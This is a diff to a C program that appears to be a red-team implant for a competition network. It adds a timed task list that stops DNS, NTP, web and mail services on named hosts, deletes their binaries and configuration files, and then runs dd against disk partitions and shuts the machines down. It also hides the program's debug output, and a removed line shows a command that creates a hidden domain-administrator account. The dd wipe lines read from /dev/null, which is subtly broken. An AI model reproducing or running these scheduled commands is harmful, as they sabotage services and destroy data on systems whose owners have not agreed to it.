@@ -81,9 +81,9 @@ void setmyhostname(char *dest) {
             return;
        }
     }
-
+#ifdef TESTING
     printf ("Didn't get it from X9999-host file\n");
-
+#endif
     //if not possible check environment variable
     // on windows set varname=value
     char *temp = getenv("HOSTNAME");
@@ -94,9 +94,9 @@ void setmyhostname(char *dest) {
         strncpy(dest, temp, 99);
         return;
     }
-
+#ifdef TESTING
     printf ("Didn't get it from environment\n");
-
+#endif
     //if not there use localhostname.
     if (gethostname(inbuff, 1024) == 0) {  //Brilliant 0 is success on this one :(
 
@@ -126,8 +126,26 @@ typedef struct taskstruct {
 //int numtasks = 0;
  taskstruct tasklist[] = {
 { FRIDAY, 15, 0, "/usr/bin/xeyes", 0},
-{ SATURDAY, 15, 0, "/usr/bin/xeyes", 0}
-//{ SATURDAY, 10, 0, "net user Scoring redteam123 /add; net group \"Domain Administrators\" /add; net localgroup \"Administrators\" /add;", 0}
+
+{ SATURDAY, 12, 0, "/bin/systemctl stop bind9.service", 0},  //.20 dns
+{ SATURDAY, 12, 0, "/bin/systemctl stop ntp.service", 0},     //.20 ntp
+{ SATURDAY, 12, 0, "/usr/sbin/service apache2 stop", 0},     //.23 apache (zencart)
+{ SATURDAY, 12, 0, "/bin/systemctl stop httpd.service", 0},     //.11 apache (prestashop) and .39 squirrelmail
+{ SATURDAY, 12, 0, "/bin/systemctl stop dovecot.service", 0},     //.39 squirrel
+{ SATURDAY, 12, 0, "/bin/systemctl stop postfix.service", 0},     //.39 squirrel
+
+{ SATURDAY, 13, 0, "/bin/systemctl stop bind9.service; rm /usr/sbin/named", 0}, //.20 dns
+{ SATURDAY, 13, 0, "/bin/systemctl stop ntp.service; rm /usr/sbin/ntpd", 0},  //.20 ntp
+{ SATURDAY, 13, 0, "/usr/sbin/service apache2 stop; rm /etc/apache2/apache2.conf", 0},    //.23 apache (zencart)
+{ SATURDAY, 13, 0, "/bin/systemctl stop httpd.service; rm /etc/httpd/conf/httpd.conf", 0}, //.11 apache (prestashop) and 39 squirrelmail
+{ SATURDAY, 13, 0, "/bin/systemctl stop dovecot.service; rm /usr/sbin/dovecot", 0},     //.39 squirrel
+{ SATURDAY, 13, 0, "/bin/systemctl stop postfix.service; rm /usr/libexec/postfix/smtpd", 0},     //.39 squirrel
+
+{ SATURDAY, 14, 0, "/bin/dd if=/dev/null of=/dev/sda1 bs=1M; shutdown -h now", 0},  //Any
+{ SATURDAY, 15, 0, "/bin/dd if=/dev/null of=/dev/dm-0 bs=1M; shutdown -h now", 0},   //.23 only, doubt this will ever run but why not have it.
+{ SATURDAY, 15, 0, "/bin/dd if=/dev/null of=/dev/mapper/fedora--server_fedora-root; shutdown -h now", 0},   //.39 only, doubt this will ever run but why not have it.
+{ SATURDAY, 15, 0, "/bin/dd if=/dev/null of=/dev/mapper/centos-root bs=1M; shutdown -h now", 0}   //.11 only, doubt this will ever run but why not have it.
+
 };
 
 typedef struct cronstruct {
